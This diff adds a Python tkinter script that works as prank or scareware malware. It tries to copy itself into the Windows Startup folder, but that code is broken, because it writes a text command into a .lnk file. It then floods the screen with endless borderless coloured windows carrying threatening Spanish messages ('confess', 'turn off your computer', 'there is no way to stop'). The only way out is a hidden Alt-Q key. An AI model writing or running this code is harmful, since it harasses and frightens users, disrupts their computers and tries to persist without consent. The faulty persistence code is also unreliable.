@@ -1,0 +1,55 @@
+import random
+from tkinter import Tk, Button 
+from tkinter import *
+from random import randint
+import time
+import threading
+import os
+# Crear un acceso directo del archivo actual
+shortcut = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "startup_script.lnk")
+with open(shortcut, "w") as file:
+    file.write('CreateShortcut "%s" "python.exe" "%s" "" ""' % (os.path.abspath(__file__), os.path.abspath(__file__)))
+
+# Resto del código
+random.seed()
+root = Tk()
+root.attributes("-alpha", 0)
+root.overrideredirect(1)
+root.attributes("-topmost", 11)
+
+# Crear una variable compartida entre los hilos
+stop_event = threading.Event()
+
+text2 = ["QUEMADOS MODELO", "CONFIESA", "HABLA", "ESTO SEGUIRÁ APARECIENDO HASTA QUE CONFIECES", "TIENES QUE CONFEZAR", "ES UN BUCLE", "DIRECCIÓN", "APAGA TU COMPUTADORA", "NO HAY FORMA DE PARAR"]
+
+def placeWindows():
+    while not stop_event.is_set():
+        win = Toplevel(root)
+        r = randint(0, 255)
+        g = randint(0, 255)
+        b = randint(0, 255)
+        color = "#{:02x}{:02x}{:02x}".format(r, g, b)
+        win.configure(bg=color)
+        time.sleep(0.1)
+        x = randint(0, root.winfo_screenwidth()-200)
+        y = randint(0, root.winfo_screenheight()-300)
+        win.geometry("200x300+{}+{}".format(x, y))
+        win.overrideredirect(12)
+        Label(win, text=random.choice(text2), fg="red").place(relx=.38, rely=.3)
+        win.lift()
+        win.attributes("-topmost", True)
+        win.attributes("-topmost", False)
+        root.lift()
+        root.attributes("-topmost", True)
+        root.attributes("-topmost", False)
+        time.sleep(0.1)
+        root.update()
+    root.destroy()
+
+def exit(event):
+    # Setear la variable compartida para detener el bucle
+    stop_event.set()
+
+root.bind("<Alt-q>", exit)
+threading.Thread(target=placeWindows).start()
+root.mainloop()
